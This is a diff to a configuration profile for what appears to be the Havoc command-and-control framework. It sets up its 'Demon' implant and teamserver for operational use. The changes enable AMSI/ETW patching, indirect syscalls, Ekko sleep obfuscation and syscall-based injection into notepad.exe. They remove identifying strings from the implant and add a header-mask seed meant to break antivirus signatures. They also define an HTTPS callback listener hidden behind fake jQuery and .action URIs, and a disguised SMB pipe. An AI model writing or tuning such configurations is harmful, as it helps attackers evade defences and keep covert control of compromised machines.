@@ -2,15 +2,23 @@ Teamserver {
     Host = "0.0.0.0"
     Port = 40056
 
+    # [HVC-003] Per-packet XOR mask seed for outer header obfuscation. Optional.
+    # Accepts hex ("0x...") or decimal. Must fit in 32 bits and be non-zero.
+    # Default if omitted: 0xA3F1C2B4. Same value is propagated to every Demon
+    # payload built by this teamserver via -DHEADER_MASK_SEED=... so wire format
+    # round-trips. Change this to break signature matches against stock builds.
+    # Value must be 8 characters after 0x..
+    HeaderMaskSeed = "0x344cfbca"
+
     Build {
-        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
-        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
         Nasm = "/usr/bin/nasm"
     }
 }
 
 Operators {
-    user "5pider" {
+    user "kr0ff" {
         Password = "password1234"
     }
 
@@ -26,14 +34,82 @@ Service {
 }
 
 Demon {
-    Sleep = 2
+    Sleep = 10
     Jitter = 15
+
+    IndirectSyscall  = true
+    StackDuplication = true
+
+    # Accepted: "WaitForSingleObjectEx", "Foliage", "Ekko", "Zilean"
+    SleepTechnique = "Ekko"
+
+    # Accepted: "None", "jmp rax", "jmp rbx" (only applies to Ekko/Zilean)
+    SleepJmpGadget = "jmp rbx"
+
+    # Accepted: "None (LdrLoadDll)", "RtlRegisterWait", "RtlCreateTimer", "RtlQueueWorkItem"
+    ProxyLoading = "RtlQueueWorkItem"
+
+    # Accepted: "None", "HWBP", "Hardware breakpoints"
+    AmsiEtwPatching = "HWBP"
 
     TrustXForwardedFor = false
 
     Injection {
         Spawn64 = "C:\\Windows\\System32\\notepad.exe"
         Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
+
+        # Accepted: "Win32", "Native/Syscall"
+        Alloc   = "Native/Syscall"
+        Execute = "Native/Syscall"
+    }
+
+    Binary {
+        ReplaceStrings-x64 = {
+            "demon.x64.dll": "",
+            "This program cannot be run in DOS mode.": "",
+        }
+
+        ReplaceStrings-x86 = {
+            "demon.x86.dll": "",
+            "This program cannot be run in DOS mode.": "",
+        }
     }
 }
 
+Listeners {
+    Http {
+		Name = "HTTP/S Agent"
+		Hosts = [
+			"192.168.100.3",
+			]
+		HostBind     = "0.0.0.0"
+        	PortBind     = 443
+        	PortConn     = 443
+        	HostRotation = "round-robin"
+        	Secure       = true
+        	UserAgent    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
+
+		Uris = [
+            		"/js/jquery3.8.js",
+            		"/index.action",
+            		"/query/fi/profile.action",
+            		"/a/o/integration.action"
+        	]
+
+        	Headers = [
+            		"Content-type: text/plain",
+        	]
+
+        	Response {
+            		Headers = [
+                		"Content-type: text/plain",
+            		]
+        	}
+
+	  }
+
+    Smb {
+        Name = "Smb"
+        PipeName = "msagent_01"
+      }
+}
